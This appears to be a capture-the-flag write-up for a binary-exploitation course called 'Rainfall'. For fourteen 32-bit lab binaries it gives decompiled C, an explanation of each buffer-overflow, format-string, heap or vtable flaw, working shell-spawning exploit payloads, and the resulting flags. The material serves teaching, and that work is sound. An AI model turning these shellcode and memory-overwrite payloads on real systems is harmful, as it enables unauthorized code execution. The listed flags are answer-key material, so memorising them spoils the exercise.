# 🌊 Rainfall

## 📖 Overview

Rainfall is a practical introduction to **reverse engineering** and **binary exploitation**.  
The project focuses on analyzing small C programs, spotting hidden vulnerabilities, and crafting exploits to take advantage of them.  

The ultimate goal is to understand how software behaves at runtime and how attackers can manipulate memory to **gain unauthorized access** or **change program execution**.


## 🎯 Objectives

This project builds strong foundations in **low-level security** by working directly with ELF binaries on a 32-bit Linux system.  

You will learn how to:
- **Disassemble and analyze binaries** using tools like `gdb`, `objdump`, and `strings`
- **Understand process memory layout** (stack, heap, BSS, data)
- **Identify vulnerabilities** such as:
  - Buffer overflows
  - Format string exploits
  - Misuse of unsafe functions (`strcpy`, `memcpy`, `atoi`, etc.)
- **Exploit weaknesses** to:
  - Overwrite return addresses
  - Redirect execution flow
  - Spawn a shell or access protected files

> [!TIP]
> checksec --file fileName => check permissions

## 📚 Documentation / References

[Registres x86 / x86-64 & Assemblage](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html?utm_source=chatgpt.com)  
[Introduction to Assembly language](https://medium.com/@sruthk/cracking-assembly-introduction-to-assembly-language-a4ad14e601a1)

## 📖 Levels

- [LEVEL0](#level0---binary-analysis)
- [LEVEL1](#level1---binary-analysis)
- [LEVEL2](#level2---binary-analysis)
- [LEVEL3](#level3---binary-analysis)
- [LEVEL4](#level4---binary-analysis)
- [LEVEL5](#level5---binary-analysis)
- [LEVEL6](#level6---binary-analysis)
- [LEVEL7](#level7---binary-analysis)
- [LEVEL8](#level8---binary-analysis)
- [LEVEL9](#level9---binary-analysis)
- [BONUS0](#bonus0---binary-analysis)
- [BONUS1](#bonus1---binary-analysis)
- [BONUS2](#bonus2---binary-analysis)
- [BONUS3](#bonus3---binary-analysis)

## LEVEL0 - BINARY ANALYSIS

```c

int main(int argc, char *argv[]) {
	int input_value;
	char *command;
	__uid_t effective_uid;
	__gid_t effective_gid;

	input_value = atoi(argv[1]);

	if (input_value == 0x1a7) { // 0x1a7 = 423 in decimal
		command = strdup("/bin/sh");
		effective_gid = getegid();
		effective_uid = geteuid();
		setresgid(effective_gid, effective_gid, effective_gid);
		setresuid(effective_uid, effective_uid, effective_uid);
		execv("/bin/sh", &command);
	} else {
		fwrite("No!\n", 1, 5, stderr);
	}
	return 0;
}
```

## LEVEL0 - EXPLANATION & SOLUTION

The binary executes a shell (/bin/sh) if it receives a specific argument matching the value 0x1a7 in hexadecimal, which equals 423 in decimal.

The setresgid and setresuid functions change the effective group ID and user ID to the current user's IDs. This ensures the shell runs with the appropriate privileges.

```bash
./level0 423
```

## LEVEL0 - FLAG

1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

## LEVEL1 - BINARY ANALYSIS

```c
void main(void) {
	char buffer[76];

	gets(buffer);
	return;
}
```

## LEVEL1 - EXPLANATION & SOLUTION

Vulnerability: Buffer Overflow

The binary uses the unsafe gets function to read input into a buffer of size 76 bytes. Since gets does not check input length, providing input larger than 76 bytes causes a buffer overflow, allowing us to overwrite the return address and execute arbitrary code.

1. Analyze the binary with GDB:

	```bash
	gdb ./level1
	```

	- List functions:
	```bash
	i functions
	```

	- Examine the stack:
	```bash
	i stack
	```

	- Disassemble main:
	```bash
	disas main
	```
	- Set a breakpoint at main:
	```bash
	b main
	```
	- Dump the stack contents for further inspection:
	```bash
	x/50x $esp
	```

	- Add a breakpoint on the leave instruction and check the return adress value with $ebp + 4
	```bash
	b *<address_of_leave>
	x/x $ebp + 4
	```

2. Testing the Buffer Overflow:

	- To verify the buffer overflow, run the program with 76 bytes of input:
	```
	run <<< $(python -c 'print("A" * 76)')
	```

3. Craft the exploit:

	Overwrite the return address with the address of shellcode or a NOP sled leading to it.

	Use Python to generate the payload:

	- Simple buffer overflow with direct shellcode:
	```python
	(python -c 'print("A" * 76 + "\x60\xf7\xff\xbf" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'; cat) | ./level1
	```

	We redirect the stream to the program with a pipe and we add the command `cat` to keep the shell alive.

	- Buffer overflow with a NOP sled for better reliability:
	```python
	(python -c 'print("A" * 76 + "\x70\xf7\xff\xbf" + "\x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'; cat) | ./level1
	```


## LEVEL1 - FLAG

53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

## LEVEL2 - BINARY ANALYSIS

```c
void main(void) {
	p();
	return;
}

void p(void) {
	uint retaddr;
	char buffer[76];

	fflush(stdout);
	gets(buffer);

	if ((retaddr & 0xb0000000) == 0xb0000000) {
		printf("(%p)\n", retaddr);
		_exit(1);
	}

	puts(buffer);
	strdup(buffer);
	return;
}
```

## LEVEL2 - EXPLANATION & SOLUTION

Vulnerability: Buffer Overflow with Return Address Validation

The binary contains a buffer overflow vulnerability in the gets function within the p function. The program attempts to validate the return address to prevent execution of shellcode from restricted memory regions (0xb0000000). However, this check can be bypassed with proper payload construction.

1. Analyze the binary with GDB:

	```
	gdb ./level2
	i functions
	disas p
	b *<address_of_leave>
	run
	x/x $ebp+4
	x/50x $esp
	...
	```

2. Bypassing the Check:

	- The validation checks whether the return address falls within 0xb0000000. To bypass this, we ensure the return address points to an executable region in memory, such as the stack.

	- Overwrite the buffer and redirect execution to our shellcode.


3. Crafting the Exploit:

	- Buffer overflow with shellcode
	```python
	(python -c 'print("A" * 8) + "\x08\xf7\xff\xbf" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + ("A" * 40)' ; cat ) | ./level2
	```

	(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 50)' ; cat ) | ./level2


4. GDB:

	```python
	run <<< $(python -c 'print("A" * 72)')
	```

## LEVEL2 - FLAG

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

## LEVEL3 - BINARY ANALYSIS

```c
void v(void) {
	char buffer[520];

	fgets(buffer, 512, stdin);
	printf(buffer);

	if (m == 64) {
		fwrite("Wait what?!\n", 1, 0xc, stdout);
		system("/bin/sh");
	}
	return;
}

void main(void) {
	v();
	return;
}
```

## LEVEL3 - EXPLANATION & SOLUTION

Vulnerability: Format String in printf

The printf function is called with a user-controlled buffer without a proper format specifier. This creates a format string vulnerability, which allows arbitrary memory read/write operations.

1. Find the Address of `m`:

	- Use objdump to locate the symbol table and find the address of m:
	```bash
	objdump -t level3
	```

2. Inspect the Stack:

	- Use the `%x` format specifier to inspect the stack and identify the index of the writable memory location:
	```bash
	python -c 'print("\x8c\x98\x04\x08" + "%x " * 4)' | ./level3
	```

3. Write to the Address of m:

	- Use the `%<index>$n` format specifier to write directly to the memory address. This allows us to set the value of m to 0x40 (64 in decimal).
	- The value 0x40 is equivalent to 64 in decimal. Adjust the number of bytes printed to achieve this value.


4. Construct the Exploit:

	- Use padding to ensure the correct number of bytes are printed before writing to the memory:
	```bash
	(python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")'; cat) | ./level3
	```
	- `\x8c\x98\x04\x08`: The address of m in little-endian format.
	- `%60x`: Pads the output to 60 bytes, ensuring m is set to 64 when written.
	- `%4$n`: Writes the current number of bytes printed to the 4th stack argument.

5. GDB:

	```python
	run <<< $(python -c 'print("\x8c\x98\x04\x08" + "A"*60 + "%4$n")')
	```

## LEVEL3 - FLAG

b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

## LEVEL4 - BINARY ANALYSIS

```c
void main(void) {
	n();
	return;
}

void n(void) {
	char buffer[520];

	fgets(buffer, 512, stdin);
	p(buffer);

	if (m == 0x1025544) {
		system("/bin/cat /home/user/level5/.pass");
	}
	return;
}

void p(char *buffer) {
	printf(buffer);
	return;
}
```

## LEVEL4 - EXPLANATION & SOLUTION

Vulnerability: Format String in printf

The printf function in the p function is called with user-controlled input without specifying a format string. This introduces a format string vulnerability, allowing an attacker to write arbitrary values into memory.

1. Find the Address of m:

	- Use objdump to find the symbol table and identify the address of the variable m:
	```bash
	objdump -t level4
	```

2. Inspect the Stack:

	- Test the stack to find the offset for the format string:
	```bash
	python -c 'print("\x10\x98\x04\x08" + "%x " * 12)' | ./level4
	```

3. Write to the Address of m:

	- To set m to 0x1025544 (16930116 in decimal), use the %<number>x format specifier to pad the output:
	```bash
	(python -c 'print("\x10\x98\x04\x08" + "%16930112x" + "%12$n")'; cat) | ./level4
	```
	- `\x10\x98\x04\x08`: The address of m in little-endian format.
	- `%16930112x`: Pads the output to 16930112 bytes. Adjust as needed to reach 0x1025544.
	- `%12$n`: Writes the total number of bytes printed so far into the 12th stack argument.

## LEVEL4 - FLAG

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

## LEVEL5 - BINARY ANALYSIS

```c
void main(void) {
	n();
	return;
}

void n(void) {
	char buffer[520];

	fgets(buffer,512,stdin);
	printf(buffer);
	exit(1);
}

void o(void) {
	system("/bin/sh");
	exit(1);
}
```


## LEVEL5 - EXPLANATION & SOLUTION

Video : https://www.youtube.com/watch?v=t1LH9D5cuK4

Vulnerability: Format String in printf

The printf function in the n function uses user-controlled input without specifying a format string. This creates a format string vulnerability, which allows arbitrary memory read/write operations. By exploiting this, we can redirect the exit function's address to the o function to execute a shell.

1. Find the Address of the o Function:

	- Use objdump to analyze the binary and find the address of the o function: 0x080484a4
	```bash
	objdump -t level5
	```

2. Find the Address of exit in n: 0x8049838

	- Locate the exit function's address used in the n function:
	```bash
	gdb ./level5
	disas n
	disas 0x80483d0
	```
	- we want:
	```bash
	set {int}0x8049838=0x080484a4
	```

3. Construct the Exploit:

	- The goal is to overwrite the address at 0x08049838 (used by exit) with the address of o (0x080484a4).
	- Use the %hn format specifier to write the lower and higher bytes of 0x080484a4 into memory in two steps:
		- Write 0x84a4 to the lower bytes.
		- Write 0x0804 to the higher bytes.

4. Payload

	- Example payload:
	```bash
	(python -c 'print("\x38\x98\x04\x08" + "\x40\x98\x04\x08" + "%33948x" + "%4$hn" + "%1x" + "%5$hn")'; cat) | ./level5
	```
	- `\x38\x98\x04\x08`: Address of exit (lower bytes).
	- `\x40\x98\x04\x08`: Address of exit + 2 (higher bytes).
	- `%33948x`: Pads output to write 0x84a4 (decimal 33948 + 8 for 2 adresses).
	- `%4$hn`: Writes the lower 2 bytes to the address at the 4th stack position.
	- `%5$hn`: Writes the upper 2 bytes to the address at the 5th stack position.

5. GDB

	```python
	run <<< $(python -c 'print("\x38\x98\x04\x08" + "\x40\x98\x04\x08" + "%33948x" + "%4$hn" + "%1x" + "%5$hn")')
	```

## LEVEL5 - FLAG

d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

## LEVEL6 - BINARY ANALYSIS

```c
int main() {
	char *buffer;
	int *p;

	buffer = (char*)malloc(64);
	p = (int*)malloc(4);
	*p = m;
	strcpy(buffer, argv[1]);
	((void (*)(void))*p)();
	return 0;
}

void m() {
	puts("Nope");
	return;
}

void n(void) {
	system("/bin/cat /home/user/level7/.pass");
	return;
}
```

## LEVEL6 - EXPLANATION & SOLUTION

Vulnerability: Function Pointer Overwrite

- The binary uses a dynamically allocated function pointer (puVar1) initialized with the address of m.
- The user input is copied into __dest via strcpy without bounds checking.
- This allows an overflow, enabling the overwrite of *puVar1 with the address of n.
The goal is to overwrite the function pointer pointing to m (puts("Nope")) with the address of n (system("/bin/cat /home/user/level7/.pass")).

1. Find the Address of n: 0x08048454 and m: 0x08048468

	- Use objdump to analyze the binary and find the address of the n function:
	```bash
	objdump -t level6
	```

2. Find the Overflow Offset:

	- To determine how much data to input before overwriting the function pointer, use padding with GDB:
	```bash
	b <adress_strcopy>
	run `python -c 'print("A" * 4)'`
	ni
	x/200x $eax
	```
	Examine the stack and heap to identify where the overflow occurs.

3. Execute the Exploit:

	```bash
	./level6 `python -c 'print("A" * 72 + "\x54\x84\x04\x08")'`
	```

## LEVEL6 - FLAG

f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

## LEVEL7 - BINARY ANALYSIS

```c
int main() {
	char *buff1;
	char *buff2;
	char *buff3;
	FILE *stream;

	buff1 = (char*)malloc(8);
	*buff1 = 1;

	buff2 = (char*)malloc(8);
	buff1[1] = buff2;

	buff3 = (char*)malloc(8);
	*buff3 = 2;

	buff2 = malloc(8);
	buff3[1] = buff2;

	strcpy((char *)buff1[1], argv[1]);
	strcpy((char *)buff3[1], argv[2]);
	stream = fopen("/home/user/level8/.pass");
	fgets(c, 0x44, strean);
	puts("~~");
	return 0;
}

void m() {
	time_t current_time;

	current_time = time(0);
	printf("%s - %d\n", c, current_time);
	return;
}
```

## LEVEL7 - EXPLANATION & SOLUTION

The binary has a vulnerability due to improper memory management and a lack of bounds checking, allowing us to overwrite memory.

The strcpy function is used to copy command-line arguments into memory buffers (struct1[1] and struct2[1]) without bounds checking.
This allows overwriting critical memory locations, such as function pointers.

1. Find the location of the m function, which prints the flag along with a timestamp: 0x080484f4

	```bash
	objdump -t level7
	```

2. Find the jump address to modify: 0x08049928

	```bash
		info functions
		info functions puts
		x/i 0x08048400
	```

3. GDB

	```bash
	run `python -c 'print("A" * 20 + "\x28\x99\x04\x08")'` `python -c 'print("\xf4\x84\x04\x08")'`
	```
	If we try this payload in GDB, we get a `segfault` in the `fgets` function. That's because GDB tries to open a file it doesn't have permission to access. But outside of GDB, the program should work correctly.

4. Exploit

	```bash
	./level7 `python -c 'print("A" * 20 + "\x28\x99\x04\x08")'` `python -c 'print("\xf4\x84\x04\x08")'`
	```

<!-- PLT GOT -->

## LEVEL7 - FLAG

5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

## LEVEL8 - BINARY ANALYSIS

```c
undefined4 main(void) {
	char char_read;
	char *auth_buffer;
	char *service_buffer;
	int comparison_result;
	uint length_check;
	byte *input_ptr;
	byte *command_ptr;
	char input_buffer[5];
	char auth_command[2];
	char service_command[125];
	char *auth = NULL;
	char *service = NULL;

	while (1) {
		printf("%p, %p \n", auth, service);
		char *input = fgets((char *)input_buffer, 0x80, stdin);
		if (input == NULL) {
			return 0;
		}


		comparison_result = strncmp(input_buffer, "auth ", 5);
		if (comparison_result == 0) {
			auth = (char *)malloc(4);
			if (auth == NULL) {
				continue;
			}
			memset(auth, 0, 4);
			if (strlen(auth_command) < 0x1f) {
				strcpy(auth, auth_command);
			}
		}

		comparison_result = strncmp(input_buffer, "reset", 5);
		if (comparison_result == 0) {
			if (auth != NULL) {
				free(auth);
				auth = NULL;
			}
		}

		comparison_result = strncmp(input_buffer, "service", 7);
		if (comparison_result == 0) {
			service = strdup(service_command);
		}

		comparison_result = strncmp(input_buffer, "login", 5);
		if (comparison_result == 0) {
			if (auth != NULL && *(int *)(auth + 0x20) == 0) {
				fwrite("Password:\n", 1, 10, stdout);
			} else {
				system("/bin/sh");
			}
		}
	}
}

```

## LEVEL8 - EXPLANATION & SOLUTION

1. Heap overflow:

	- The service command uses strdup, which allocates a memory space and copies user data without size validation.
	- This allows overwriting adjacent memory, such as the auth buffer, by overflowing the allocated space.
	- The login command checks if *(auth + 0x20) is non-zero. If true, it triggers the execution of /bin/sh.

2. Strategy:

	- Use the auth command to allocate a 4-byte buffer.
	- Overflow the auth buffer via the service command to modify adjacent memory.
	- Trigger the login command, which now satisfies the condition to execute /bin/sh.

3. Exploit
	```bash
	./level8
	auth AAAA
	service AAAAAAAAAAAAAAA
	login
	```

## LEVEL8 - FLAG

c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

## LEVEL9 - BINARY ANALYSIS

```c++
void main(int argc, char *argv[]) {
	N *first_object;
	N *second_object;

	if (argc < 2) {
		_exit(1);
	}

	first_object = (N *)operator.new(0x6c);
	N::N(first_object, 5);

	second_object = (N *)operator.new(0x6c);
	N::N(second_object, 6);

	N::setAnnotation(first_object, argv[1]);

	(*(code *)**(undefined4 **)second_object)(second_object, first_object);

	return;
}

void __thiscall N::N(N *this,int param_1) {
	*(undefined ***)this = &PTR_operator+_08048848;
	*(int *)(this + 0x68) = param_1;
	return;
}

int __thiscall N::operator+(N *this,N *param_1) {
  return *(int *)(param_1 + 0x68) + *(int *)(this + 0x68);
}

int __thiscall N::operator-(N *this,N *param_1) {
	return *(int *)(this + 0x68) - *(int *)(param_1 + 0x68);
}

void __thiscall N::setAnnotation(N *this,char *param_1) {
	size_t __n;

	__n = strlen(param_1);
	memcpy(this + 4,param_1,__n);
	return;
}

```

## LEVEL9 - EXPLANATION & SOLUTION


1. Buffer Overflow Vulnerability:
	- The setAnnotation() function in the binary uses memcpy() to copy user input (argv[1]) into a buffer without size validation.
	- This allows overwriting the stack, including saved return addresses, to redirect the program's execution flow.
	- The goal is to overwrite a function pointer or return address so that it points to a shellcode injected into the buffer.

2. Strategy:
	- Determine the offset to the return address using a pattern like Aa0Aa1... to find where the buffer starts to overwrite the saved return address.
	- Inject a shellcode that executes /bin/sh into the buffer.
	- Modify the return address to point to an address that dereferences the shellcode's starting location.
	- Exploit the double dereference in the binary's logic to execute the shellcode.

3. Exploit:

	- Generate a unique pattern to find the exact offset where the buffer overflows:

	```bash
	gdb run 'AAAABBBB...'
	```
	Find the faulting address in EAX, which determines the offset (108 bytes in this case).

4. Exploit
	```bash
	./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08")')
	```

	- `\x10\xa0\x04\x08`: Address of the payload (shellcode) on the heap.
	- Shellcode: A standard payload for spawning a shell.
	- `"A" * 80` padding: Fills the memory until the vtable pointer.
	- `\x0c\xa0\x04\x08`: Address where the modified vtable pointer resides.


5. GDB
	```bash
	run `python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08")'`
	```

## LEVEL9 - FLAG

f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

## BONUS0 - BINARY ANALYSIS

```c
int main(void) {
	char buffer[54];

	pp(buffer);
	puts(buffer);
	return 0;
}

void pp(char *final_buffer) {
	char first_input[20];
	char second_input[20];
	char *tmp_buffer;
	unsigned int length;

	p(first_input, "Enter first string:");
	p(second_input, "Enter second string:");

	strcpy(final_buffer, first_input);

	length = 0xffffffff;
	tmp_buffer = final_buffer;
	do {
		if (length == 0) break;
		length = length - 1;
	} while (*tmp_buffer++ != '\0');

	final_buffer[length] = ' ';
	final_buffer[length + 1] = '\0';
	strcat(final_buffer, second_input);
	return;
}

void p(char *dest_buffer, char *param2) {
	char temp_buffer[4104];
	char *newline_position;

	puts(param2);
	read(0, temp_buffer, 4096);
	newline_position = strchr(temp_buffer, '\n');
	*newline_position = '\0';
	strncpy(dest_buffer, temp_buffer, 20);
}
```

## BONUS0 - EXPLANATION & SOLUTION


1. Buffer Overflow Vulnerability:

	- The binary accepts two inputs separated by a space and prints them together.
	- The p() function reads up to 4096 characters into a buffer that is not null-terminated.
	- A subsequent call to strncpy() copies the first 20 bytes of the input to another buffer, but it does not add a null terminator if the input exceeds 20 bytes.
	- By providing a first input of exactly 20 characters and a second input that includes carefully crafted data, the lack of null termination allows memory overflow into the return address (EIP).
	- We can exploit this to execute arbitrary shellcode by controlling the flow of execution.


```bash
run < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99" + "A"*4075 + "\n\xb0\x0b\xcd\x80" + "A"*5 + "\x26\xf7\xff\xbf" + "A"*7 ')
```

```bash
(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99" + "A"*4075 + "\n\xb0\x0b\xcd\x80" + "A"*5 + "\x26\xf7\xff\xbf" + "A"*7' ; cat) | ./bonus0
```

## BONUS0 - FLAG

cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

## BONUS1 - BINARY ANALYSIS

```c
undefined4 main(undefined4 param_1, int param_2) {
	undefined4 result;
	char buffer[40];
	int input_length;

	input_length = atoi(*(char **)(param_2 + 4));
	if (input_length < 10) {
		memcpy(buffer, *(void **)(param_2 + 8), input_length * 4);

		if (input_length == 0x574f4c46) {
			execl("/bin/sh", "sh", 0);
		}
		result = 0;
	} else {
		result = 1;
	}
	return result;
}
```

## BONUS1 - EXPLANATION & SOLUTION

1. Functionality of the Program

	- The first argument is converted to an integer (nb) using atoi().
		To reach the vulnerable memcpy(), nb must be ≤ 9.
	- The second argument is copied into a buffer located 40 bytes above the location of the atoi() return.
	- The program compares nb with 0x574f4c46. If they are equal, it calls execl().
	- Vulnerability: The memcpy() function copies 4 * nb bytes from the second argument into the buffer. This introduces a buffer overflow if nb is manipulated to exceed the buffer's size constraints.

0x574f4c46 corresponds to the ASCII string "FLOW"

0xb7e454d3 addr retour main

0x08048482 call de execl (not forget argument to work)

run -1073741810 $(python -c 'print("A" * 500)')

<!-- x/x $esp+0x3c

p *(int*)($esp+0x3c)

set {int}($esp+0x3c) = 0x574f4c46 -->

```bash
./bonus1 -1073741809 $(python -c 'print("A" * 56 + "\x82\x84\x04\x08")')
```

## BONUS1 - FLAG

579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

## BONUS2 - BINARY ANALYSIS

```c
int main(int argc,int *argv[])
{
	undefined4 uVar1;
	int i;
	char *pcVar3;
	undefined4 *puVar4;
	byte bVar5;
	char buffer1[40];
	char buffer2[36];
	char *lang_env;

	bVar5 = 0;
	if (argc == 3) {
		pcVar3 = buffer1;
		for (i = 0x13; i != 0; i = i + -1) {
			pcVar3[0] = '\0';
			pcVar3[1] = '\0';
			pcVar3[2] = '\0';
			pcVar3[3] = '\0';
			pcVar3 = pcVar3 + 4;
		}
		strncpy(buffer1,*(char **)(argv[1]),40);
		strncpy(buffer2,*(char **)(argv[2]),32);
		lang_env = getenv("LANG");
		if (lang_env != (char *)0x0) {
			i = memcmp(lang_env,&DAT_0804873d,2);
			if (i == 0) {
				language = 1;
			}
			else {
				i = memcmp(lang_env,&DAT_08048740,2);
				if (i == 0) {
				language = 2;
				}
			}
		}
		pcVar3 = buffer1;
		puVar4 = (undefined4 *)&stack0xffffff50;
		for (i = 0x13; i != 0; i = i + -1) {
			*puVar4 = *(undefined4 *)pcVar3;
			pcVar3 = pcVar3 + ((uint)bVar5 * -2 + 1) * 4;
			puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
		}
		uVar1 = greetuser();
	}
	else {
		uVar1 = 1;
	}
	return uVar1;
}

void greetuser(void)
{
	char prefix [4];
	char suffix [64];
	int suffix_value;

	if (language == 1) {
		builtin_strncpy(prefix,"Hyvè",4);
		suffix_value._0_1_ = cv;
		suffix_value._1_1_ = -0x3d;
		suffix_value._2_1_ = -0x5c;
		suffix_value._3_1_ = ' ';
		builtin_strncpy(suffix,"päivää ",11);
	}
	else if (language == 2) {
		builtin_strncpy(prefix,"Goed",4);
		suffix_value._0_1_ = 'e';
		suffix_value._1_1_ = 'm';
		suffix_value._2_1_ = 'i';
		suffix_value._3_1_ = 'd';
		builtin_strncpy(suffix,"dag!",4);
		suffix[4] = ' ';
		suffix[5] = '\0';
	}
	else if (language == 0) {
		builtin_strncpy(prefix,"Hell",4);
		suffix_value._0_3_ = 0x206f;
	}
	strcat(prefix,&stack0x00000004);
	puts(prefix);
	return;
}
```

## BONUS2 - EXPLANATION & SOLUTION

1. Behavior of Arguments

	- argv[1]: At most 40 bytes are copied into a buffer.
	- argv[2]: At most 32 bytes are copied into the same buffer at offset 40 (just after argv[1]).

2. Interaction with LANG Environment Variable

	- If the environment variable LANG is set to specific values (fi or nl), the program uses different greeting messages, influencing the buffer sizes.
	- The global variable is set:
		1 for LANG=fi
		2 for LANG=nl

3. Vulnerability

	- If the LANG variable is either fi or nl and the parameter passed to greetuser() is sufficiently long, it allows an overwrite of the return address (EIP).

4. Find the offset

	```bash
	run $(python -c 'print("A" * 40)') $(python -c 'print("B" * 32)')
	run $(python -c 'print("A" * 40)') AAAABBBBCCCCDDDDEEEEFFFFGGGG...
	```
5. Exploit

	```bash
	LANG=fi ./bonus2 `python -c 'print "\x90"*(41-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'` `python -c 'print "B"*18 + "\xb0\xf6\xff\xbf"'`
	```

6. GDB

	```bash
	run $(python -c 'print("A" * 2 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 14)') $(python -c 'print("B" * 18 + "\x14\xf6\xff\xbf")')
	```


## BONUS2 - FLAG

71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

## BONUS3 - BINARY ANALYSIS

```c
undefined4 main(int argc,char *argv[])
{
	undefined4 uVar1;
	int i;
	char *pointer;
	byte byte_value;
	char buff65[65];
	undefined unused_var;
	char buff66[66];
	FILE *file_ptr;

	byte_value = 0;
	file_ptr = fopen("/home/user/end/.pass","r");
	pointer = buff65;
	for (i = 33; i != 0; i = i + -1) {
		pointer[0] = '\0';
		pointer[1] = '\0';
		pointer[2] = '\0';
		pointer[3] = '\0';
		pointer = pointer + ((uint)byte_value * -2 + 1) * 4;
	}
	if ((file_ptr == (FILE *)0x0) || (param_1 != 2)) {
		uVar1 = 0xffffffff;
	}
	else {
		fread(buff65,1,66,file_ptr);
		unused_var = 0;
		i = atoi(*(char **)(argv[1]));
		buff65[i] = '\0';
		fread(buff66,1,65,file_ptr);
		fclose(file_ptr);
		i = strcmp(buff65,*(char **)(argv[1]));
		if (i == 0) {
			execl("/bin/sh","sh",0);
		}
		else {
			puts(local_56);
		}
		uVar1 = 0;
	}
	return uVar1;
}
```

## BONUS3 - EXPLANATION & SOLUTION

1. The string provided as argv[1] is converted into an integer using atoi and then used to manipulate buffer65:

	- If argv[1] is an empty string (""), atoi returns 0.
	- This null-terminates buffer65 at index 0, making it an empty string ("").

2. The function strcmp(buffer65, argv[1]) is called:

	- If argv[1] is also an empty string, the comparison succeeds (strcmp("", "") == 0).
	- The program executes execl("/bin/sh", "sh", NULL) to open a shell.

## BONUS3 - FLAG

3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c